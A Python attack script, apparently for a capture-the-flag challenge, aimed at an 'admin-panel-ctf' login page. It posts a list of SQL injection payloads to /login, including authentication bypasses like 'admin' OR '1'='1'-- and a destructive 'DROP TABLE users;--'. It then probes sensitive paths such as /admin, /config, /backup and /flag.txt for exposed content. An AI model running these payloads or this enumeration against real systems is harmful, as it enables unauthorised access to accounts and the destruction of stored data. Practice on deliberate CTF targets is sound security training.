#!/usr/bin/env python3
"""
Analyze the login form and test for vulnerabilities
"""

import requests
import re
from urllib.parse import urljoin

def get_full_source(url):
    """Get the full HTML source"""
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return response.text
        else:
            print(f"HTTP {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

def test_sql_injection(base_url):
    """Test for SQL injection in login form"""
    login_url = urljoin(base_url, "/login")
    
    # Common SQL injection payloads
    payloads = [
        {"username": "admin", "password": "admin"},
        {"username": "admin'--", "password": "anything"},
        {"username": "admin' OR '1'='1'--", "password": "anything"},
        {"username": "admin' OR 1=1--", "password": "anything"},
        {"username": "' OR '1'='1", "password": "' OR '1'='1"},
        {"username": "admin", "password": "' OR '1'='1'--"},
        {"username": "admin'/*", "password": "*/OR/*", "extra": "*/1=1--"},
        {"username": "admin'; DROP TABLE users;--", "password": "anything"},
    ]
    
    print("Testing SQL injection payloads...")
    
    for i, payload in enumerate(payloads):
        try:
            response = requests.post(login_url, data=payload, timeout=10, allow_redirects=False)
            print(f"Payload {i+1}: {payload}")
            print(f"  Status: {response.status_code}")
            
            if response.status_code == 302:
                print(f"  Redirect to: {response.headers.get('Location', 'Unknown')}")
            
            if "flag" in response.text.lower() or "hw{" in response.text.lower():
                print(f"  *** POTENTIAL FLAG FOUND ***")
                print(f"  Response: {response.text[:500]}")
            
            if len(response.text) > 0:
                print(f"  Response preview: {response.text[:200]}")
            
            print()
            
        except requests.exceptions.RequestException as e:
            print(f"  Error: {e}")

def test_other_endpoints(base_url):
    """Test other potential endpoints"""
    endpoints = [
        "/register",
        "/dashboard",
        "/profile",
        "/logout",
        "/api/login",
        "/api/users",
        "/api/admin",
        "/admin/login",
        "/admin/dashboard",
        "/flag",
        "/flag.txt",
        "/secret",
        "/backup",
        "/config",
        "/debug",
        "/test"
    ]
    
    print("Testing other endpoints...")
    for endpoint in endpoints:
        url = urljoin(base_url, endpoint)
        try:
            response = requests.get(url, timeout=5)
            if response.status_code not in [404, 403]:
                print(f"[{response.status_code}] {url}")
                if "flag" in response.text.lower() or "hw{" in response.text.lower():
                    print(f"  *** POTENTIAL FLAG FOUND ***")
                    print(f"  Response: {response.text[:500]}")
        except requests.exceptions.RequestException:
            continue

def main():
    base_url = "https://admin-panel-ctf.onrender.com"
    
    print("=== Admin Panel Analysis ===")
    
    # Get full HTML source
    print("Getting full HTML source...")
    html = get_full_source(base_url)
    if html:
        print("HTML Source:")
        print(html)
        print("\n" + "="*50 + "\n")
    
    # Test SQL injection
    test_sql_injection(base_url)
    
    # Test other endpoints
    test_other_endpoints(base_url)

if __name__ == "__main__":
    main()